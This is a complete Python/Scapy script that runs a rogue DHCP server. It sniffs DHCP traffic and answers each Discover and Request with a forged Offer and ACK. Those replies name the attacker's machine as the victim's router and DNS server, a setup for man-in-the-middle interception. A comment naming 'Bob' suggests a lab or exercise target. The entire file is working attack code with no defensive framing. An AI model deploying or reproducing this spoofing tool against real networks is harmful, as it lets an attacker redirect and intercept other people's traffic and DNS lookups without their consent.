# stanley_dhcp.py
from scapy.all import get_if_hwaddr, Ether, IP, UDP, BOOTP, DHCP, sendp, sniff

iface = "br0"           # Replace with your interface name
your_mac = get_if_hwaddr(iface)
your_ip = "192.168.0.254" # DHCP server IP (gateway)
target_ip = "192.168.0.10"
subnet_mask = "255.255.255.0"
lease_time = 43200      # 12 hours lease

def dhcp_handler(pkt):
    if DHCP in pkt and BOOTP in pkt:
        dhcp_type = pkt[DHCP].options[0][1]
        client_mac = pkt[Ether].src

        # If other DHCP servers send Offer, block/drop them by not forwarding
        if dhcp_type == 2:  # DHCP Offer
            print(f"[!] Other DHCP Offer detected from {client_mac}, dropping it.")
            # Optionally, send your own Offer here if you want
            return  # Do nothing, effectively ignoring other offers
        if dhcp_type == 1:  # DHCP Discover
            print(f"[+] DHCP Discover from {client_mac}, sending Offer for {target_ip}")

            ether = Ether(dst=client_mac, src=your_mac)
            ip = IP(src=your_ip, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)
            chaddr = pkt[BOOTP].chaddr
            xid = pkt[BOOTP].xid
            bootp = BOOTP(
                op=2,
                yiaddr=target_ip,
                siaddr=your_ip,
                chaddr=chaddr,
                xid=xid,
                flags=pkt[BOOTP].flags
            )
            dhcp = DHCP(options=[
                ("message-type", "offer"),
                ("server_id", your_ip),
                ("lease_time", lease_time),
                ("subnet_mask", subnet_mask),
                ("router", your_ip),
                ("name_server", your_ip),
                "end"
            ])

            offer_pkt = ether / ip / udp / bootp / dhcp
            sendp(offer_pkt, iface=iface, verbose=False)
            print("[+] DHCP Offer sent")

        # Respond to DHCP Request from Bob's MAC (or all DHCP Requests)
        if dhcp_type == 3:  # DHCP Request
            xid = pkt[BOOTP].xid
            chaddr = pkt[BOOTP].chaddr
            print(f"[+] DHCP Request from {client_mac}, sending ACK with IP {target_ip}")

            ether = Ether(dst=client_mac, src=your_mac)
            ip = IP(src=your_ip, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)
            bootp = BOOTP(
                op=2,
                yiaddr=target_ip,
                siaddr=your_ip,
                chaddr=chaddr,
                xid=xid,
                flags=pkt[BOOTP].flags
            )
            dhcp = DHCP(options=[
                ("message-type", "ack"),
                ("server_id", your_ip),
                ("lease_time", lease_time),
                ("subnet_mask", subnet_mask),
                ("router", your_ip),
                ("name_server", your_ip),
                "end"
            ])

            ack_pkt = ether / ip / udp / bootp / dhcp
            sendp(ack_pkt, iface=iface, verbose=False)
            print("[+] DHCP ACK sent")

sniff(
    iface=iface,
    filter="udp and (port 67 or 68)",
    prn=dhcp_handler,
    store=0
)
